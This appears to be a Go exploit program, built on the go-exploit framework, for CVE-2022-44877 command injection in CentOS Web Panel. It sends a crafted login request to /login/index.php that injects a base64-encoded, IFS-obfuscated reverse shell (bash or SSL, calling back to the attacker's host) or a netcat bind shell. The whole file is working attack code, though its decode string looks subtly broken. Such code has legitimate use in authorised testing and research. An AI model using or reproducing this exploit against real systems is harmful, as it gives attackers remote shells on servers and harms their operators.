package main

import (
	"encoding/base64"
	"github.com/vulncheck-oss/go-exploit"
	"github.com/vulncheck-oss/go-exploit/protocol"
	"github.com/vulncheck-oss/go-exploit/c2"
	"github.com/vulncheck-oss/go-exploit/config"
	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/random"
	"github.com/vulncheck-oss/go-exploit/payload"
)


type CWPInjection struct {}


func (sploit CWPInjection) ValidateTarget(conf *config.Config) bool{
	return false
}

func (sploit CWPInjection) CheckVersion(conf *config.Config) exploit.VersionCheckType{
	return exploit.NotImplemented
}

func (sploit CWPInjection) RunExploit(conf *config.Config) bool{
	generated, ok := generatePayload(conf)
	if !ok{
		return false
	}

	loginAttempt := map[string]string{
		"username": "%72%6f%6f%74",
		"password": random.RandLetters(8),
		"commit": "Login",
	}

	target := protocol.GenerateURL(conf.Rhost, conf.Rport, conf.SSL, "/login/index.php")
	output.PrintSuccess("Sending exploit to " + target)

	resp, _, ok := protocol.HTTPSendAndRecvURLEncoded("POST",target+"?t=1&login="+generated,loginAttempt)
	if !ok {
		return false
	}

	if resp.StatusCode != 200{
		output.PrintError("Received an unexpected HTTP Status code: %d",resp.StatusCode)

		return false
	}
	output.PrintStatus("Done")

	return true
}

func generatePayload(conf *config.Config) (string, bool){
	generated := ""

	switch conf.C2Type{
		case c2.SSLShellServer:
			output.PrintStatus("Sending an SSL reverse shell payload for port: %s:%d",conf.Lhost,conf.Lport)
			generated = payload.ReverseShellMknodOpenSSL(conf.Lhost, conf.Lport)
		
		case c2.SimpleShellServer:
			output.PrintStatus("Sending a reverse shell payload for port: %s:%d",conf.Lhost,conf.Lport)
			generated = payload.ReverseShellBash(conf.Lhost, conf.Lport)
		
		case c2.SimpleShellClient:
			output.PrintStatus("Sending a bind shell for port: %d",conf.Bport)
			generated = payload.BindShellMkfifoNetcat(conf.Bport)

		default:
			output.PrintError("Invalid Payload")

			return "",false
		}
		encoded_payload := base64.StdEncoding.EncodeToString([]byte(generated))
		generated = "`echo${IFS}" + encoded_payload + "|base64${IFS}-d/bin/sh`"

		return generated, true
}

func main(){

	supportedC2 := []c2.Impl{
		c2.SSLShellServer,
		c2.SimpleShellServer,
		c2.SimpleShellClient,
	}
	conf := config.New(config.CodeExecution, supportedC2, "CentOS Web Panel","CVE-2022-44877",2031)
	sploit := CWPInjection{}
	
	exploit.RunProgram(sploit, conf)

}
